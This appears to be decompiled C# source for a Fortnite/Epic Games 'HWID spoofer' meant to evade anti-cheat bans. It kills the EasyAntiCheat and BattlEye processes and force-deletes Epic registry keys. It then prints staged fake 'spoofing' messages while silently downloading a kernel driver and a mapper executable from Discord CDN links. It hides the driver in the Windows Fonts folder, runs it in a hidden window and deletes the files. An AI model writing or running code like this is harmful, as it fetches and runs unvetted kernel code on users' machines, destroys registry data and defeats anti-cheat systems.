using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Security.Principal;
using System.Threading;

namespace API_Example
{
	// Token: 0x0200000E RID: 14
	internal class Spoofer
	{
		// Token: 0x0600005D RID: 93 RVA: 0x0000A8E8 File Offset: 0x00008AE8
		public static void cleantraces()
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.StandardInput.WriteLine("taskkill /f /im UnrealCEFSubProcess.exe");
			process.StandardInput.WriteLine("taskkill /f /im CEFProcess.exe");
			process.StandardInput.WriteLine("taskkill /f /im EasyAntiCheat.exe");
			process.StandardInput.WriteLine("taskkill /f /im BEService.exe");
			process.StandardInput.WriteLine("taskkill /f /im BEServices.exe");
			process.StandardInput.WriteLine("taskkill /f /im BattleEye.exe");
			process.StandardInput.WriteLine("taskkill /f /im epicgameslauncher.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteLauncher.exe");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\EpicGames\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CLASSES_ROOT\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Hardware Survey\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Identifiers\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\EpicGames\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\EpicGames\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_USERS\\" + Spoofer.SIDCleaner + "\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("exit");
			Cleaners.ModifyRegistry();
			Cleaners.FileCleaner();
			Cleaners.FeggotCleaner();
		}

		// Token: 0x0600005E RID: 94 RVA: 0x0000AB44 File Offset: 0x00008D44
		public static string DiskdriveCheck()
		{
			string text = "";
			try
			{
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_DiskDrive");
				foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					try
					{
						text += managementObject["SerialNumber"].ToString();
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			bool flag = text == "";
			if (flag)
			{
			}
			return text;
		}

		// Token: 0x0600005F RID: 95 RVA: 0x0000AC0C File Offset: 0x00008E0C
		public static void spoof1()
		{
			Console.Clear();
			Draw.print1();
			Console.WriteLine("[!] Spoofing Start");
			Thread.Sleep(2000);
			Console.WriteLine("[+] Spoofing MAC");
			Thread.Sleep(2000);
			Console.WriteLine("[+] Spoofing SMBIOS");
			Thread.Sleep(2000);
			Console.WriteLine("[+] Spoofing Bios");
			Thread.Sleep(2000);
			Console.WriteLine("[+] Spoofing DiskDrive");
			Thread.Sleep(2000);
			Console.WriteLine("[+] Spoofing Volume ID");
			Thread.Sleep(2000);
			Console.WriteLine("[+] Spoofing Network Adapters");
			WebClient webClient = new WebClient();
			string text = "C:\\Program Files\\mapper.exe";
			string text2 = "C:\\Windows\\Fonts\\spoof.sys";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/651522382200176690/660983927883825163/spoofer.sys", text2);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/651522382200176690/660984792061313024/mapper_3.exe", text);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process = Process.Start(text, text2);
			Thread.Sleep(1000);
			process.Close();
			File.Delete(text2);
			File.Delete(text);
		}

		// Token: 0x04000024 RID: 36
		private static string SIDCleaner = WindowsIdentity.GetCurrent().User.Value;
	}
}
